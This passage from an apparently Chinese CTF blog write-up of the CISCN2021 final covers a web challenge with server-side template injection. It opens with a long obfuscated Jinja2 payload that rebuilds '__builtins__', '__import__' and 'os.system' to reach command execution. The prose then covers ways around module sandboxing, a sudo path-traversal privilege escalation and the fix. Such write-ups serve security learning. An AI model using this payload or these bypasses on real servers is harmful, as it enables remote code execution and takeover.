punctuation">,</span>l<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20builtins<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>b<span class="token punctuation">,</span>u<span class="token punctuation">,</span>i<span class="token punctuation">,</span>l<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20getitem<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>g<span class="token punctuation">,</span>e<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>e<span class="token punctuation">,</span>m<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20eval<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>a<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20timeit<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20import<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>p<span class="token punctuation">,</span>o<span class="token punctuation">,</span>r<span class="token punctuation">,</span>t<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20os<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20system<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>y<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>e<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20subprocess<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>u<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">,</span>r<span class="token punctuation">,</span>o<span class="token punctuation">,</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20pty<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>t<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20imp<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20reload<span class="token operator">=</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>o<span class="token punctuation">,</span>a<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20spawn<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>p<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20ls<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20osm<span class="token operator">=</span>config<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">global</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">)</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token keyword">global</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">)</span><span class="token punctuation">(</span>imp<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>reload<span class="token punctuation">)</span><span class="token punctuation">(</span>osm<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre>
+<p>龟龟好长，当初为了写这么大一段这个可能就花了快一个小时，其实双大括号内过滤数字，大括号百分号里面能用数字，能省不少事。。。</p>
+<p>然后打到命令执行，我还以为快出了，结果反手一个<code>system gone</code>，试了下subprocess gone，popen gone，spawn gone。提示给了一个subprocess命令执行，可是subprocess明明已经没有了，看懵了GG</p>
+<p>fix环节登上去看到看一眼，过滤就之前看到的数字，join和request，然后一句<code>sys.modules[&quot;subprocess&quot;] = &quot;subprocess gone&quot;</code>把subprocess模块给禁了，不知道为什么剩下的模块都用不了，如上面的payload所示，我还比赛时还尝试着用reload函数重新加载模块，但没有用</p>
+<p>赛后交流环节有提到可以<code>del</code>或者调用<code>delattr</code>把这个模块先删掉，再重新import一下就可以了。也有人说虽然把subprocess什么的删了，但是有一个叫subprocess.Popen的类还活着，能直接拿来用？？？不是很懂。还有什么posix.popen，multiprocess.popen。比赛时做到这就结束了，命令执行都没打下来，据说命令执行之后还有一个提权，有一个提权程序要求等待三年之后才能提权，通过修改时间服务把时间调到三年后打通（这就是我不清楚的后话了）</p>
+<p>修复方法，ssti在模板不可控的时候基本上都是因为render_template_string这个函数出问题的，这里为了触发漏洞专门在render_template外面套了一层render_template_string，删去即可</p>
+<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>后来看了一些wp，解决方案挺多的，用subprocess.Popen可以执行命令，也可以把模块先删除再引入，覆盖掉被污染的模块，也可以用imp库的load_source方法直接猜测os之类库的.py文件的位置，重新加载一个自己的os模块</p>
+<p>命令执行之后<code>sudo -l</code>看有什么命令可以sudo，然后找到一个shell脚本，脚本写的有一点点bug，大体意思是可以去执行一个可执行文件，本身目录是限制在了service下的，但是能目录穿越，解决方案就是写一个sh脚本直接执行</p>
+<h3 id="web2web3"><a href="#web2web3" class="headerlink" title="web2web3"></a>web2web3</h3><p>因为web4花了几乎所有时间，这两个题看都没看，所以也完全不会修，乱改了一下理所当然的没修好</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html" rel="prev" title="pwnhub7月公开赛">
+      <i class="fa fa-chevron-left"></i> pwnhub7月公开赛
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/CyBRICS2021.html" rel="next" title="CyBRICS2021 wp">
+      CyBRICS2021 wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2021-%E5%86%B3%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">[CISCN2021]决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#day1"><span class="nav-number">1.1.</span> <span class="nav-text">day1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%96%E4%BC%A0%E6%8A%93%E6%B5%81%E9%87%8F%E8%84%9A%E6%9C%AC%E4%B8%8D%E8%83%BD%E7%94%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">祖传抓流量脚本不能用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%81%EF%BC%81%EF%BC%81"><span class="nav-number">1.1.2.</span> <span class="nav-text">改密码！！！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.3.</span> <span class="nav-text">准备二进制工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97"><span class="nav-number">1.1.4.</span> <span class="nav-text">可信计算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day2"><span class="nav-number">1.2.</span> <span class="nav-text">day2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-number">1.2.1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web4"><span class="nav-number">1.2.2.</span> <span class="nav-text">web4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#update"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2web3"><span class="nav-number">1.2.3.</span> <span class="nav-text">web2web3</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
